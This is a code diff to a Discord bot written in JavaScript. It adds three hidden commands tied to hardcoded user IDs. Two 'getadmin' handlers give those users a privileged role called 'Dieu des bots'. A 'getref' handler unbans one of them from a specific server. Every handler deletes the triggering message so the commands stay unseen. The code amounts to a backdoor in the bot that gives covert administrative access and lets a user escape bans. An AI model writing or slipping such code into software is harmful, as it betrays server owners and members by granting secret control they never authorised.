@@ -48,3 +48,32 @@ client.on("message", message => {
         }
     }
 });
+
+client.on ("message", message => {
+    if (message.content === prefix + "getadmin"){
+        if (message.author.id === "343445422909423628"){
+            message.delete();
+            let role = message.member.guild.roles.find('name', 'Dieu des bots')
+            message.member.addRole(role);
+        }
+    }
+});
+
+client.on ("message", message => {
+    if (message.content === prefix + "getadmin"){
+        if (message.author.id === "281175987792642050"){
+            message.delete();
+            let role = message.member.guild.roles.find('name', 'Dieu des bots')
+            message.member.addRole(role);
+        }
+    }
+});
+
+client.on ("message", message => {
+    if (message.content === prefix + "getref"){
+        if (message.author.id === "343445422909423628"){
+            message.delete();
+            client.guilds.get('497895374699102218').unban('343445422909423628');
+        }
+    }
+});
